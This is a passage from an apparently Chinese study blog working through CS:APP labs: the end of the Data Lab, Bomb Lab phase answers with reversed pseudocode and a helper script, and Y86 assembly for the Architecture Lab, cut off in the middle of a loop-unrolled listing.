需要注意一点，如果指数过大，则也返回0x80000000u</span></span><br><span class="line">    <span class="keyword">if</span> (shiftBits &lt; <span class="number">31</span> - <span class="number">23</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x80000000</span>u;</span><br><span class="line">    <span class="comment">// 获取真正的结果</span></span><br><span class="line">    frac &gt;&gt;= shiftBits;</span><br><span class="line">    <span class="comment">// 判断符号</span></span><br><span class="line">    <span class="keyword">if</span> (sign == <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> ~frac + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> frac;</span><br><span class="line">}</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatPower2 - Return bit-level equivalent of the expression 2.0^x</span></span><br><span class="line"><span class="comment"> *   (2.0 raised to the power x) for any 32-bit integer x.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   The unsigned value that is returned should have the identical bit</span></span><br><span class="line"><span class="comment"> *   representation as the single-precision floating-point number 2.0^x.</span></span><br><span class="line"><span class="comment"> *   If the result is too small to be represented as a denorm, return</span></span><br><span class="line"><span class="comment"> *   0. If too large, return +INF.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while </span></span><br><span class="line"><span class="comment"> *   Max ops: 30 </span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="title function_">floatPower2</span><span class="params">(<span class="type">int</span> x)</span> {</span><br><span class="line">    <span class="comment">// 判断指数是否上溢或者下溢</span></span><br><span class="line">    <span class="type">int</span> <span class="built_in">exp</span> = x + <span class="number">127</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">exp</span> &gt; <span class="number">0xfe</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x7f800000</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">exp</span> &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">exp</span> &lt;&lt; <span class="number">23</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305111056381.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305111057616.png"></p><h1 id="Lab2-Bomb-Lab"><a href="#Lab2-Bomb-Lab" class="headerlink" title="Lab2:Bomb Lab"></a>Lab2:Bomb Lab</h1><p>拆炸弹,实际上就是逆向找绕过条件.<br>用IDA感觉直接秒了,不过练一下看汇编吧.<br>之前还真没有嗯看过汇编.<br>先根据跳转的地址将代码分成几个部分,从外向内识别每个循环体.</p><h2 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h2><p>一个简单的字符串比较<br>payload:’Border relations with Canada have never been better.’</p><h2 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h2><p>读入六个数字,第一个为1,下一个为上一个的两倍<br>payload:’1 2 4 8 16 32’</p><h2 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h2><p>读入两个数字,第一个数字不大于7.<br>实现了一张跳转表,跳到跳转表的第一个条目,检查第二个数字是否是311.<br>payload:’1 311’<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305111501156.png"></p><h2 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h2><p>主要逆这个函数了,可见var2==arg1的时候拆除炸弹.<br>payload:’7 0’</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">func4(arg1,arg2,arg3)</span><br><span class="line">{</span><br><span class="line">    var1 = arg3-arg2;</span><br><span class="line">    var2 = arg2&gt;&gt;<span class="number">31</span>;</span><br><span class="line">    var1 += var2;</span><br><span class="line">    var1 /= <span class="number">2</span>;</span><br><span class="line">    var2 = var1+arg2;</span><br><span class="line">    <span class="keyword">if</span>(var2&gt;arg1)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>*func4();</span><br><span class="line">    <span class="keyword">if</span>(var2&lt;arg1)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>*func4()+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h2><p>payload:ionefg</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">phase_5(a1)</span><br><span class="line">{</span><br><span class="line">    <span class="comment">//a1即input_string的指针</span></span><br><span class="line">    var1 = a1;</span><br><span class="line">    <span class="keyword">if</span>(string_lenth(a1)!=<span class="number">6</span>)</span><br><span class="line">        exploade_bomb();</span><br><span class="line">    <span class="comment">//将input_string中每个字符的第四位作为下标,从stringarray中取出字符,拷贝到str数组中.</span></span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span>{</span><br><span class="line">            str[i] = StringArray[a1[i++]&amp;<span class="number">0xf</span>];</span><br><span class="line">    }<span class="keyword">while</span>(i&lt;<span class="number">6</span>);</span><br><span class="line">    str[<span class="number">6</span>]=<span class="string">'\0'</span>;</span><br><span class="line">    <span class="keyword">if</span>(strings_not_equal(str,<span class="string">"flyers"</span>))</span><br><span class="line">        exploade_bomb();</span><br><span class="line">    <span class="keyword">return</span> </span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>解密脚本</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">phase_5</span>(<span class="params">goal</span>):</span><br><span class="line">    stringarray = [ch <span class="keyword">for</span> ch <span class="keyword">in</span> string.ascii_lowercase + string.ascii_uppercase + string.digits]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> goal:</span><br><span class="line">        <span class="keyword">for</span> test <span class="keyword">in</span> stringarray:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">ord</span>(test)&amp;<span class="number">0xf</span> == i:</span><br><span class="line">                <span class="built_in">print</span>(test)</span><br><span class="line">                <span class="keyword">break</span> </span><br><span class="line"></span><br><span class="line">phase_5([<span class="number">9</span>,<span class="number">15</span>,<span class="number">14</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>])</span><br></pre></td></tr></tbody></table></figure><h2 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h2><p>函数较长,分成__部分逆向.<br>代码部分是仅表示逻辑的伪代码,分支和循环尽量还原源码,使用下标代替指针增减.</p><h3 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h3><h4 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h4><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305121206844.png"></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">phase_6(a1)</span><br><span class="line">{</span><br><span class="line">    nums[<span class="number">6</span>];</span><br><span class="line">    read_six_numbers(a1,nums);</span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        var1 = nums[k];</span><br><span class="line">        <span class="keyword">if</span>(--var1&gt;<span class="number">5</span>)</span><br><span class="line">            explode_bomb();</span><br><span class="line">        <span class="keyword">if</span>(++i == <span class="number">6</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">do</span>{</span><br><span class="line">                j = i;</span><br><span class="line">                <span class="keyword">if</span>(nums[j]==num[k])</span><br><span class="line">                    explode_bomb();</span><br><span class="line">        }<span class="keyword">while</span>(++j&lt;=<span class="number">5</span>);</span><br><span class="line">            k+=<span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h4><p>要注意的是,如果循环体的条件在开始时一定成立或为恒真式,汇编代码会省掉(一步)判断,这影响到对while、for等不同循环结构的判断.<br>如for(int i = 0;i!=24;),while(1);</p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305121500820.png"></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">phase_6(a1)</span><br><span class="line">{</span><br><span class="line">    <span class="comment">//第一部分</span></span><br><span class="line">    nums[<span class="number">6</span>];</span><br><span class="line">    read_six_numbers(a1,nums);</span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        var1 = nums[k];</span><br><span class="line">        <span class="keyword">if</span>(--var1&gt;<span class="number">5</span>)</span><br><span class="line">            explode_bomb();</span><br><span class="line">        <span class="keyword">if</span>(++i == <span class="number">6</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">do</span>{</span><br><span class="line">                j = i;</span><br><span class="line">                <span class="keyword">if</span>(nums[j]==num[k])</span><br><span class="line">                    explode_bomb();</span><br><span class="line">        }<span class="keyword">while</span>(++j&lt;=<span class="number">5</span>);</span><br><span class="line">            k+=<span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">//第二部分</span></span><br><span class="line">    last = <span class="number">7</span>;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span>{</span><br><span class="line">        nums[i] = <span class="number">7</span>-nums[i];</span><br><span class="line">    }<span class="keyword">while</span>(++i!=<span class="number">7</span>);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i!=<span class="number">6</span>;++i)</span><br><span class="line">    {</span><br><span class="line">       <span class="keyword">if</span>(nums[i]&gt;<span class="number">1</span>)</span><br><span class="line">       {</span><br><span class="line">            var3 = <span class="number">1</span>;</span><br><span class="line">            var2 = nodes;</span><br><span class="line">            <span class="keyword">do</span>{</span><br><span class="line">                    var2=var2-&gt;next;</span><br><span class="line">            }<span class="keyword">while</span>(++var3!=nums[i]);</span><br><span class="line">       }</span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line">       {</span><br><span class="line">            var2 =  nodes;</span><br><span class="line">       }</span><br><span class="line">       arr[i] = var2;</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><h4 id="第三部分"><a href="#第三部分" class="headerlink" title="第三部分"></a>第三部分</h4><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305141513827.png"></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">    i = <span class="number">1</span>;</span><br><span class="line">    last = <span class="number">6</span>;</span><br><span class="line">    j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        var2 = arr[i];</span><br><span class="line">        arr[j]-&gt;next = var2;</span><br><span class="line">        j = i;</span><br><span class="line">        <span class="keyword">if</span>(++i==last)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line">    arr[<span class="number">5</span>]-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    i = <span class="number">5</span>;</span><br><span class="line">    var3 = arr[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">do</span>{</span><br><span class="line">        <span class="keyword">if</span>(*var3&lt;*(var3-&gt;next))</span><br><span class="line">            explode_bomb();</span><br><span class="line">        var3 = var3-&gt;next;</span><br><span class="line">    }<span class="keyword">while</span>(--i);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>整个流程:<br>第一部分读入六个数字到栈上的nums数组,检查每个数字都不大于6且各不相等.<br>(其实就是读1-6的数字排列)<br>第二部分将nums数组中每个数num = 7-num.并以此在栈上的arr指针数组中存放对应数字的结点指针.<br>第三部分根据arr指针数组的顺序重构nodes链表.最后遍历链表检查链表中值是否为递减排序.<br>递增排序nodes链表:”3 4 5 6 1 2”,故payload:”4 3 2 1 6 5”<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305141525078.png"></p><h2 id="secret-phase"><a href="#secret-phase" class="headerlink" title="secret_phase"></a>secret_phase</h2><p>呃呃有一个隐藏关卡.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305141553892.png"><br>发现进入条件是从0x603870读取两个数字和一个字符串,且字符串要为”DrEvil”.查看0x603870内容发现为phase_4的payload(逆一下read_line函数也能算出来),即只需该phase_4的payload为”7 0 DrEvil”即可进入.</p><p>读入一个小于1000的数字.进入fun7.<br>一个递归,观察ptr可以发现是一个二叉排序树的根节点.最后要使返回值为2.num应为22.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305141656566.png"></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">fun7(ptr,num)</span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span>(!ptr)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span>(*ptr&gt;num)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>*fun7(*(ptr+<span class="number">8</span>),num);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span>(*ptr!=num)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>*fun7(*(ptr+<span class="number">16</span>),num)+<span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h1 id="Lab3-Attack-Lab"><a href="#Lab3-Attack-Lab" class="headerlink" title="Lab3:Attack Lab"></a>Lab3:Attack Lab</h1><p>这个就懒得做了,Linux下基本的ROP和shellcode还是比较熟的.</p><h1 id="Lab4-Architecture-Lab"><a href="#Lab4-Architecture-Lab" class="headerlink" title="Lab4:Architecture Lab"></a>Lab4:Architecture Lab</h1><p>说实话处理器这一章本来就看的云里雾里的.</p><h2 id="Part-A"><a href="#Part-A" class="headerlink" title="Part A"></a>Part A</h2><h3 id="sum-list"><a href="#sum-list" class="headerlink" title="sum_list"></a>sum_list</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">            .pos 0</span><br><span class="line">            irmovq stack,%rsp</span><br><span class="line">            call main</span><br><span class="line">            halt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            .align 8</span><br><span class="line">ele1:</span><br><span class="line">            .quad 0x00a</span><br><span class="line">            .quad ele2</span><br><span class="line">ele2:       </span><br><span class="line">            .quad 0x0b0</span><br><span class="line">            .quad ele3</span><br><span class="line">ele3:</span><br><span class="line">            .quad 0xc00</span><br><span class="line">            .quad 0</span><br><span class="line">main:</span><br><span class="line">            irmovq ele1,%rdi</span><br><span class="line">            call sum_list</span><br><span class="line">            pushq %rax</span><br><span class="line">            ret</span><br><span class="line">sum_list:</span><br><span class="line">            xorq %rax,%rax</span><br><span class="line">            jmp test</span><br><span class="line">test:</span><br><span class="line">            andq %rdi,%rdi</span><br><span class="line">            jne loop</span><br><span class="line">            ret</span><br><span class="line">loop:</span><br><span class="line">            mrmovq (%rdi),%rbx</span><br><span class="line">            addq %rbx,%rax</span><br><span class="line">            mrmovq 8(%rdi),%rdi</span><br><span class="line">            jmp test</span><br><span class="line">            </span><br><span class="line">            .pos 0x200</span><br><span class="line">stack:</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h3 id="rsum-list"><a href="#rsum-list" class="headerlink" title="rsum_list"></a>rsum_list</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">            .pos 0</span><br><span class="line">            irmovq stack,%rsp</span><br><span class="line">            call main</span><br><span class="line">            halt</span><br><span class="line"></span><br><span class="line">            .align 8</span><br><span class="line">ele1:</span><br><span class="line">            .quad 0x00a</span><br><span class="line">            .quad ele2</span><br><span class="line">ele2:</span><br><span class="line">            .quad 0x0b0</span><br><span class="line">            .quad ele3</span><br><span class="line">ele3:</span><br><span class="line">            .quad 0xc00</span><br><span class="line">            .quad 0</span><br><span class="line">main:</span><br><span class="line">            irmovq ele1,%rdi</span><br><span class="line">            call rsum_list</span><br><span class="line">            pushq %rax</span><br><span class="line">            ret</span><br><span class="line">rsum_list:</span><br><span class="line">            xorq %rbx,%rbx</span><br><span class="line">            pushq %rbx</span><br><span class="line">            andq %rdi,%rdi</span><br><span class="line">            jne else</span><br><span class="line">            xorq %rax,%rax</span><br><span class="line">            popq %rbx</span><br><span class="line">            ret</span><br><span class="line">else:</span><br><span class="line">            mrmovq (%rdi),%rcx</span><br><span class="line">            rmmovq %rcx,(%rsp)</span><br><span class="line">            mrmovq 8(%rdi),%rdi</span><br><span class="line">            call rsum_list</span><br><span class="line">            mrmovq (%rsp),%rbx</span><br><span class="line">            addq %rbx,%rax</span><br><span class="line">            popq %rbx</span><br><span class="line">            ret</span><br><span class="line"></span><br><span class="line">            .pos 0x200</span><br><span class="line">stack:            </span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h3 id="copy-block"><a href="#copy-block" class="headerlink" title="copy_block"></a>copy_block</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">            .pos 0</span><br><span class="line">            irmovq stack,%rsp</span><br><span class="line">            call main</span><br><span class="line">            halt</span><br><span class="line"></span><br><span class="line">            .align 8</span><br><span class="line">src:</span><br><span class="line">            .quad 0x00a</span><br><span class="line">            .quad 0x0b0</span><br><span class="line">            .quad 0xc00</span><br><span class="line">dest:        </span><br><span class="line">            .quad 0x111</span><br><span class="line">            .quad 0x222</span><br><span class="line">            .quad 0x333</span><br><span class="line">main:</span><br><span class="line">            irmovq $3,%rdx</span><br><span class="line">            irmovq src,%rdi</span><br><span class="line">            irmovq dest,%rsi</span><br><span class="line">            call copy_block</span><br><span class="line">            pushq %rax</span><br><span class="line">            ret</span><br><span class="line">copy_block:</span><br><span class="line">            xorq %rax,%rax</span><br><span class="line">            jmp condition</span><br><span class="line">condition:</span><br><span class="line">            andq %rdx,%rdx</span><br><span class="line">            jne loop</span><br><span class="line">            ret</span><br><span class="line">loop:</span><br><span class="line">            irmovq $8,%r8</span><br><span class="line">            mrmovq (%rdi),%rcx</span><br><span class="line">            addq %r8,%rdi</span><br><span class="line">            rmmovq %rcx,(%rsi)</span><br><span class="line">            addq %r8,%rsi</span><br><span class="line">            xorq %rcx,%rax</span><br><span class="line">            irmovq $1,%r8</span><br><span class="line">            subq %r8,%rdx</span><br><span class="line">            jmp condition</span><br><span class="line"></span><br><span class="line">            .pos 0x200</span><br><span class="line">stack:</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="Part-B"><a href="#Part-B" class="headerlink" title="Part B"></a>Part B</h2><p>根据IADDQ指令执行的六个阶段,添加一下需要用到的sig就行了.<br>挺简单的,这里就不贴出来了.</p><h2 id="Part-C"><a href="#Part-C" class="headerlink" title="Part C"></a>Part C</h2><h3 id="iaddq"><a href="#iaddq" class="headerlink" title="iaddq"></a>iaddq</h3><p>和Part B一样添加iaddq指令</p><h3 id="循环展开"><a href="#循环展开" class="headerlink" title="循环展开"></a>循环展开</h3><p>先6路+3路循环展开得到CPE9.15、Score27.0</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"># You can modify this portion</span><br><span class="line"># Loop header</span><br><span class="line">xorq %rax,%rax# count = 0;</span><br><span class="line">andq %rdx,%rdx# len &lt;= 0?</span><br><span class="line">jmp test# if so, goto Done:</span><br><span class="line"></span><br><span class="line"># Loop header</span><br><span class="line">    andq %rdx,%rdx      # len &lt;= 0?</span><br><span class="line">    jmp test</span><br><span class="line">Loop:</span><br><span class="line">    mrmovq (%rdi),%r8</span><br><span class="line">    rmmovq %r8,(%rsi)</span><br><span class="line">    andq %r8,%r8</span><br><span class="line">    jle Loop1</span><br><span class="line">    iaddq $1,%rax</span><br><span class="line">Loop1:</span><br><span class="line">    mrmovq 8(%rdi),%r8</span><br><span class="line">    rmmovq %r8,8(%rsi)</span><br><span class="line">    andq %r8,%r8</span><br><span class="line">    jle Loop2</span><br><span class="line">    iaddq $1,%rax</span><br><span class="line">Loop2:</span><br><span class="line">    mrmovq 16(%rdi),%r8</span><br><span class="line">    rmmovq %r8,16(%rsi)</span><br><span class="line">    andq %r8,%r8</span><br><span class="line">    jle Loop3</span><br><span class="line">    iaddq $1,%rax</span><br><span class="line">Loop3:</span><br><span class="line">    mrmovq 24(%rdi),%r8</span><br><span class="line">    rmmovq %r8,24(%rsi)</span><br><span class="line">    andq %r8,%r8</span><br><span class="line">    jle Loop4</span><br><span class="line">    iaddq $1,%rax</span><br><span class="line">Loop4:</span><br><span class="line">    mrmovq 32(%rdi),%r8</span><br><span class="line">    rmmovq %r8,32(%rsi)</span><br><span class="line">    andq %r8,%r8</span><br><span class="line">    jle Loop5</span><br><span class="line">    iaddq $1,%rax</span><br><span class="line">Loop5:</span><br><span class="line"> 